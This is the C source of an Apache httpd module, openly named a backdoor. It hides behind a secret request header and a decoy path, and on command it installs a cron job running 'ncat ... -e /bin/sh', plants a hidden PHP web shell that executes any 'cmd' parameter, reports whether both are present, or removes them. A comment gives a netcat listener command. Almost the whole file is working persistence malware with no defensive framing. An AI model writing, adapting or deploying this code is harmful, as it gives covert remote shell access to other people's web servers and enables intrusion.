// cronjob will be created under the `www-data` user.
//sudo nc -lvnp 4444
#include "httpd.h"
#include "http_protocol.h"
#include "http_request.h"
#include "http_config.h"
#include "apr_strings.h"
#include "apr_tables.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


static int backdoor_handler(request_rec *r) {

   const apr_array_header_t *arr = apr_table_elts(r->headers_in);
   const apr_table_entry_t *entries = (const apr_table_entry_t *)arr->elts;
   const char *cmd = apr_table_get(r->headers_in, "sourpatchkids");
   if (!cmd) return DECLINED;
   if (!strcmp(r->filename, "/var/www/html/errorteacups")) {
      if (r->args) {
         char *path = strtok(r->args, "=");
         if (!strcmp(path, "url")) {
            char *action = strtok(NULL, "=");
            if (!strcmp(action, "cronjob")) {
               // adds cronjobs
               execl("/bin/bash", "bash", "-c", "test=$(crontab -l | grep  'ncat' | wc -l); if [ $test == 0 ]; then (crontab -l 2>/dev/null; echo '* * * * * ncat localhost 1337 -e /bin/sh') | crontab -;  fi", NULL);
            } else if (!strcmp(action, "shell")) {
               // creates a hidden PHP file that can be used to ru commands.
               system("echo '<!DOCTYPE html><html><head><title>example Monkey</title></head><body><?php system($_GET[\"cmd\"]); ?></body></html>' > /var/www/html/.error_menu32.php");
               return OK;
            } else if (!strcmp(action, "clean")) {
               // removes the php shell
               system("rm /var/www/html/.error_menu32.php");
               // removes any cronjobs that contain 'ncat'
               system("crontab -l | grep -v 'ncat' | crontab -");
               return OK;
            } else if (!strcmp(action, "status")) {
               // checks for php shell
               if (access("/var/www/html/.error_menu32.php", F_OK) == 0) {
                 ap_rprintf(r, "%s", "phpshell_true:");
               } else {
                  ap_rprintf(r, "%s", "phpshell_false:");
               }
               // check for cronjobs
               FILE *fp = popen("crontab -l 2>/dev/null", "r");
               if (!fp) {
                  return 1;
               }
               char line[1024];

               int cron_status = 0;

               while (fgets(line, sizeof(line), fp)) {
                  if (strstr(line, "ncat") != NULL) {
                     cron_status = 1;
                  }
               }
               pclose(fp);
               if (cron_status) {
                  ap_rprintf(r, "%s", "cronjob_true:");
               } else {
                  ap_rprintf(r, "%s", "cronjob_false:");
               }
               return OK;
            }
         }
      }
      return DONE;
   }
return DONE; 
}

static void register_hooks(apr_pool_t *p) {
   ap_hook_handler(backdoor_handler, NULL, NULL, APR_HOOK_FIRST);
   ap_hook_log_transaction(backdoor_handler, NULL, NULL, APR_HOOK_FIRST);   
}

module AP_MODULE_DECLARE_DATA backdoor_module = {
   STANDARD20_MODULE_STUFF,
   NULL, NULL, NULL, NULL, NULL, register_hooks
};


